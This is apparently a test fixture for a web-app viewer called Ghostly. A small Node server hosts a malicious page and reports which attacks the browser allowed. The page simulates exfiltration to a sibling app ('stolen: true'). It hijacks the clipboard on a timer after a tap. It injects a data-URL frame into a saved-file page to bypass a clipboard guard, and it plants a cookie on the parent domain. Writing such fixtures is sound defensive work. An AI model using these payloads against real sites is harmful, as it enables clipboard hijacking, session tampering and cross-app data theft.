import { createServer } from "node:http";

/**
 * "Evil": a web app a malicious contact shares. Opened in a viewer tab, it
 * tries to reach the sibling app ("atlas") through the viewer, and to plant a
 * cookie in every viewer origin. It reports what the browser let it do.
 */
const PAGE = `<!doctype html>
<html><head><meta charset="utf-8"><title>Evil</title></head>
<body>
  <h1>Totally harmless</h1>
  <pre id="out">loading</pre>
  <button id="tap">Tap me</button><pre id="copied"></pre><pre id="planted-copied"></pre>
  <script>
    // A tap's activation lasts seconds: a copy from a timer after it would replace what the person copied.
    document.getElementById("tap").addEventListener("click", () => setTimeout(() => {
      const area = document.createElement("textarea");
      area.value = "evil";
      document.body.append(area);
      area.select();
      let copied;
      try { copied = document.execCommand("copy"); } catch { copied = false; }
      document.getElementById("copied").textContent = String(copied);
    }, 1500));
  </script>
  <script type="module">
    const [, peer] = location.hostname.split(".");
    // Works for the old (<svc>.<peer>.ghostly.invalid) and the new (<svc>.<peer>.invalid) scheme.
    const sibling = location.origin.replace(/^https:\\/\\/[^.]+/, "https://atlas");
    const parent = location.hostname.split(".").slice(2).join(".");
    const out = { sibling, parent };

    try {
      await fetch(sibling + "/api/echo?from=evil-fetch", { method: "POST", mode: "no-cors", body: JSON.stringify({ stolen: true }) });
      out.fetch = "sent";
    } catch {
      out.fetch = "blocked";
    }

    const img = new Image();
    img.src = sibling + "/pixel.png?from=evil-img";
    out.img = await img.decode().then(() => "loaded", () => "blocked");

    const frame = document.createElement("iframe");
    frame.src = sibling + "/?from=evil-iframe";
    document.body.append(frame);
    await new Promise((resolve) => setTimeout(resolve, 3000));

    // A page of its own answered as a file to save: Ghostly's error page in its place, on this origin. A frame put in it
    // would run where the clipboard guard never does, and copy from a timer after a tap in it.
    const saved = document.createElement("iframe");
    saved.id = "saved";
    saved.src = "/save";
    await new Promise((resolve) => { saved.onload = resolve; document.body.append(saved); });
    window.addEventListener("message", (event) => { if (event.data?.planted !== undefined) document.getElementById("planted-copied").textContent = String(event.data.planted); });
    const planted = "<button id=tap>Tap me</button><script>tap.onclick = () => setTimeout(() => {"
      + "const area = document.createElement('textarea'); area.value = 'evil'; document.body.append(area); area.select();"
      + "let copied; try { copied = document.execCommand('copy'); } catch { copied = false; } top.postMessage({ planted: copied }, '*');"
      + "}, 1500)</" + "script>";
    try {
      const inner = saved.contentDocument.createElement("iframe");
      inner.id = "planted";
      inner.src = "data:text/html," + encodeURIComponent(planted);
      saved.contentDocument.body.append(inner);
    } catch {}

    // The same page in a frame of this page's, navigated there: read by its index as it loads, before any guard's sweep,
    // its window would hand out an execCommand the guard never wrapped.
    const navigated = document.createElement("iframe");
    document.body.append(navigated);
    const index = window.length - 1;
    navigated.src = "/save?from=evil-own";
    out.ownPage = await new Promise((resolve) => {
      const until = Date.now() + 10_000;
      const look = () => {
        try {
          const doc = window[index].document;
          if (doc.URL.includes("/save")) return resolve("readable: " + doc.readyState + ", execCommand " + typeof window[index].Document.prototype.execCommand);
        } catch {
          return resolve("cross-origin");
        }
        if (Date.now() > until) return resolve("never loaded");
        setTimeout(look, 0);
      };
      look();
    });

    // One level up from this app's own host: the whole viewer site before the fix.
    document.cookie = "planted=1; Domain=" + parent + "; Path=/; Secure; SameSite=None";
    out.cookieAfterPlant = document.cookie;
    out.chrome = typeof chrome !== "undefined" && !!chrome.runtime?.id;

    document.getElementById("out").textContent = JSON.stringify(out);
    document.body.dataset.ready = "1";
  </script>
</body></html>`;

export function startEvil(port = 0) {
  const requests = [];
  const server = createServer((req, res) => {
    requests.push({ method: req.method, path: req.url });
    if (new URL(req.url, "http://localhost").pathname === "/") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      return res.end(PAGE);
    }
    if (new URL(req.url, "http://localhost").pathname === "/save") {
      res.writeHead(200, { "content-type": "application/zip", "content-disposition": "attachment; filename=evil.zip" });
      return res.end("PK");
    }
    res.writeHead(404, { "content-type": "text/plain" });
    res.end("not found");
  });
  return new Promise((resolve) => {
    server.listen(port, "127.0.0.1", () => resolve({ server, port: server.address().port, requests }));
  });
}
